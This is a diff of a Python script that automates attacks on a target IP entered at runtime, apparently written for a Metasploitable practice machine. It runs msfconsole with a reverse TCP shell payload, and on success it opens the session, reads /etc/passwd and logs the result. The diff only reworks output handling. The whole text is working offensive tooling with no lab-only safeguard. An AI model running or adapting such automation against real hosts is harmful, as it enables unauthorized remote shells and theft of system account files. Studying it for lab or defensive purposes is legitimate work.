@@ -89,42 +89,46 @@ def attack(host, port):
         if "is vulnerable" in output or "vulnerable to" in output:  # Adjust the check as needed
             # Proceed with the exploit if vulnerable
             msf_command = f"msfconsole -x 'use exploit/multi/handler; set PAYLOAD cmd/unix/reverse_tcp; set LHOST {host}; set LPORT {port}; exploit; sessions -l; exit -y'"
-            # Rest of the exploit code:
+
+            # Rest of the exploit code with output handling:
             process = subprocess.Popen(msf_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             stdout, stderr = process.communicate()
             exploit_output = stdout.decode()
             exploit_error = stderr.decode()
 
-            print("Metasploit Exploit Output:")
-            print(exploit_output)
-            print("Metasploit Exploit Errors:")
-            print(exploit_error)
+            # Prepare a dictionary to store output information
+            output_data = {
+                "host": host,
+                "port": port,
+                "status": "Not Compromised",  # Default status
+                "session_id": None,
+                "command_output": None
+            }
 
-            # Check for successful session creation
-            compromised = False
             if "Session 1 created" in exploit_output:
-                compromised = True
-                print("Target compromised!")
-                # Attempt to execute a command on the compromised session (e.g., cat /etc/passwd)
-                session_id = re.search(r"Session (\d+) created", exploit_output).group(1)
-                command_output = subprocess.run(f"msfconsole -x 'sessions -i {session_id}; cat /etc/passwd; exit -y'", shell=True, capture_output=True, text=True)
-                print("cat /etc/passwd output:")
-                print(command_output.stdout)
-            else:
-                print("Exploit failed.")
-                compromised = False
-            return compromised
+                output_data["status"] = "Compromised"
+                output_data["session_id"] = re.search(r"Session (\d+) created", exploit_output).group(1)
+
+                # Attempt to execute a command on the compromised session
+                command_output = subprocess.run(
+                    f"msfconsole -x 'sessions -i {output_data['session_id']}; cat /etc/passwd; exit -y'",
+                    shell=True, capture_output=True, text=True
+                )
+                output_data["command_output"] = command_output.stdout
+
+            return output_data  # Return the dictionary
 
         else:
             print(f"Host {host}:{port} is not vulnerable according to the check.")
-            return False
+            return None  # Return None if not vulnerable
 
     except FileNotFoundError:
         print("Metasploit not found. Make sure it's in your PATH.")
-        return False
+        return None
     except Exception as e:
         print(f"Error during Metasploit check or attack: {e}")
-        return False
+        return None
+
     
 def main():
     metasploitable_ip = input("Enter the IP address of the target machine: ")
@@ -136,16 +140,22 @@ def main():
         if open_ports:
             for port in open_ports:
                 print("Attempting attack on {}:{}".format(metasploitable_ip, port))
-                compromised = attack(metasploitable_ip, port)
-                if compromised:
-                    f.write("Host: {}, Port: {}, Status: Compromised\n".format(metasploitable_ip, port))
-                    print("Host: {}, Port: {}, Status: Compromised".format(metasploitable_ip, port))
+                attack_output = attack(metasploitable_ip, port)
+                if attack_output:
+                    f.write(f"Host: {attack_output['host']}, Port: {attack_output['port']}, Status: {attack_output['status']}\n")
+                    if attack_output['status'] == "Compromised":
+                        f.write(f"Session ID: {attack_output['session_id']}\n")
+                        f.write(f"Command Output: {attack_output['command_output']}\n")
                 else:
-                    f.write("Host: {}, Port: {}, Status: Not Compromised\n".format(metasploitable_ip, port))
-                    print("Host: {}, Port: {}, Status: Not Compromised".format(metasploitable_ip, port))
+                    f.write(f"Host: {metasploitable_ip}, Port: {port}, Status: Not Compromised\n")
         else:
             f.write("No open ports found.\n")
             print("No open ports found.")
+
+    # You can add further actions here based on the attack_output,
+    print("\nAttack Summary:")
+    with open("status.txt", "r") as f:
+        print(f.read())
 
 if __name__ == "__main__":
     main()
